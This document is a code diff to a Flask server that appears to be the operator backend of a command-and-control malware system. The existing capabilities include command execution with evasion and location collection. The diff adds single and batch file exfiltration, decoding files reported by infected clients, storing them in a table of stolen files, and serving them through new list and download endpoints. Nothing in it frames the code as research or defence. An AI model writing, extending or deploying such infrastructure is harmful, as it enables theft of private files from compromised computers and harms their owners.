@@ -8,10 +8,11 @@ from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
 from datetime import datetime
 import json
+import base64
 import logging
 import os
 from dotenv import load_dotenv
-from models import db, Client, Command, Result, init_db
+from models import db, Client, Command, Result, ExfiltratedFile, init_db
 
 # Load environment variables
 load_dotenv()
@@ -62,6 +63,8 @@ CAPABILITIES = {
     5: "Info Collector (start_info_collector)",
     6: "Command Executor (execute_command_with_evasion)",
     7: "Location Collector (get_location_info)",
+    8: "File Exfiltrator (exfiltrate_file)",
+    9: "Batch File Exfiltrator (exfiltrate_user_files_by_extension)",
 }
 
 
@@ -191,6 +194,58 @@ def report():
             ip=request.remote_addr
         )
         db.session.add(result)
+        
+        # Special handling for file exfiltration (capability 8)
+        if capability == 8 and result_data:
+            try:
+                # Decode the base64-encoded result
+                decoded_result = base64.b64decode(result_data).decode('utf-8')
+                file_info = json.loads(decoded_result)
+                
+                # Check if it's a successful file exfiltration (has 'content' field)
+                if 'content' in file_info and 'filename' in file_info:
+                    # Store the exfiltrated file in separate table
+                    exfil_file = ExfiltratedFile(
+                        client_id=client_id,
+                        filename=file_info.get('filename'),
+                        original_path=file_info.get('filepath', file_info.get('filename')),
+                        file_size=file_info.get('size', 0),
+                        content=file_info['content'],
+                        ip=request.remote_addr
+                    )
+                    db.session.add(exfil_file)
+                    logger.info(f"[+] File exfiltrated from {client_id}: {file_info.get('filename')} ({file_info.get('size', 0)} bytes)")
+            except Exception as e:
+                logger.warning(f"Failed to parse file exfiltration data: {str(e)}")
+        
+        # Special handling for batch file exfiltration (capability 9)
+        elif capability == 9 and result_data:
+            try:
+                # Decode the base64-encoded result (should be JSON array)
+                decoded_result = base64.b64decode(result_data).decode('utf-8')
+                files_array = json.loads(decoded_result)
+                
+                # Check if it's an array
+                if isinstance(files_array, list):
+                    files_stored = 0
+                    for file_info in files_array:
+                        # Check if each item is a valid file object
+                        if isinstance(file_info, dict) and 'content' in file_info and 'filename' in file_info:
+                            exfil_file = ExfiltratedFile(
+                                client_id=client_id,
+                                filename=file_info.get('filename'),
+                                original_path=file_info.get('filepath', file_info.get('filename')),
+                                file_size=file_info.get('size', 0),
+                                content=file_info['content'],
+                                ip=request.remote_addr
+                            )
+                            db.session.add(exfil_file)
+                            files_stored += 1
+                    
+                    logger.info(f"[+] Batch exfiltration from {client_id}: {files_stored} files stored")
+            except Exception as e:
+                logger.warning(f"Failed to parse batch file exfiltration data: {str(e)}")
+        
         db.session.commit()
         
         logger.info(f"[+] Result from {client_id} - Capability {capability} ({CAPABILITIES.get(capability, 'Unknown')}): {result_data[:50] if result_data else 'N/A'}...")
@@ -352,6 +407,116 @@ def get_client_results(client_id):
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
+@app.route('/api/files', methods=['GET'])
+def list_exfiltrated_files():
+    """
+    List all exfiltrated files
+    URL: GET /api/files
+    Optional query params: ?client_id=<client_id>
+    """
+    try:
+        client_id = request.args.get('client_id')
+        
+        if client_id:
+            files = ExfiltratedFile.query.filter_by(client_id=client_id).order_by(ExfiltratedFile.timestamp.desc()).all()
+        else:
+            files = ExfiltratedFile.query.order_by(ExfiltratedFile.timestamp.desc()).all()
+        
+        db.session.commit()  # Close transaction
+        
+        return jsonify({
+            "status": "success",
+            "count": len(files),
+            "files": [f.to_dict(include_content=False) for f in files]
+        }), 200
+    except Exception as e:
+        logger.error(f"Error listing files: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route('/api/files/<int:file_id>', methods=['GET'])
+def get_exfiltrated_file(file_id):
+    """
+    Get a specific exfiltrated file with content
+    URL: GET /api/files/<file_id>
+    """
+    try:
+        exfil_file = ExfiltratedFile.query.get(file_id)
+        if not exfil_file:
+            db.session.rollback()
+            return jsonify({"status": "error", "message": "File not found"}), 404
+        
+        db.session.commit()  # Close transaction
+        
+        return jsonify({
+            "status": "success",
+            "file": exfil_file.to_dict(include_content=True)
+        }), 200
+    except Exception as e:
+        logger.error(f"Error getting file: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route('/api/files/<int:file_id>/download', methods=['GET'])
+def download_exfiltrated_file(file_id):
+    """
+    Download exfiltrated file (returns raw decoded file content)
+    URL: GET /api/files/<file_id>/download
+    """
+    try:
+        exfil_file = ExfiltratedFile.query.get(file_id)
+        if not exfil_file:
+            db.session.rollback()
+            return jsonify({"status": "error", "message": "File not found"}), 404
+        
+        db.session.commit()  # Close transaction
+        
+        # Decode the base64 content
+        file_content = base64.b64decode(exfil_file.content)
+        
+        # Return raw file content with appropriate headers
+        from flask import Response
+        response = Response(file_content)
+        response.headers['Content-Type'] = 'application/octet-stream'
+        response.headers['Content-Disposition'] = f'attachment; filename="{exfil_file.filename}"'
+        response.headers['Content-Length'] = len(file_content)
+        
+        return response
+    except Exception as e:
+        logger.error(f"Error downloading file: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route('/api/client/<client_id>/files', methods=['GET'])
+def get_client_files(client_id):
+    """
+    Get all exfiltrated files from a specific client
+    URL: GET /api/client/<client_id>/files
+    """
+    try:
+        client = Client.query.get(client_id)
+        if not client:
+            db.session.rollback()
+            return jsonify({"status": "error", "message": "Client not found"}), 404
+        
+        files = ExfiltratedFile.query.filter_by(client_id=client_id).order_by(ExfiltratedFile.timestamp.desc()).all()
+        db.session.commit()  # Close transaction
+        
+        return jsonify({
+            "status": "success",
+            "client_id": client_id,
+            "count": len(files),
+            "files": [f.to_dict(include_content=False) for f in files]
+        }), 200
+    except Exception as e:
+        logger.error(f"Error getting client files: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
 @app.route('/api/capabilities', methods=['GET'])
 def get_capabilities():
     """
@@ -430,6 +595,10 @@ def api_index():
             "send_command": "POST /api/send_command",
             "get_client": "GET /api/client/<client_id>",
             "client_results": "GET /api/client/<client_id>/results",
+            "client_files": "GET /api/client/<client_id>/files",
+            "list_files": "GET /api/files",
+            "get_file": "GET /api/files/<file_id>",
+            "download_file": "GET /api/files/<file_id>/download",
             "capabilities": "GET /api/capabilities",
             "health": "GET /api/health"
         }
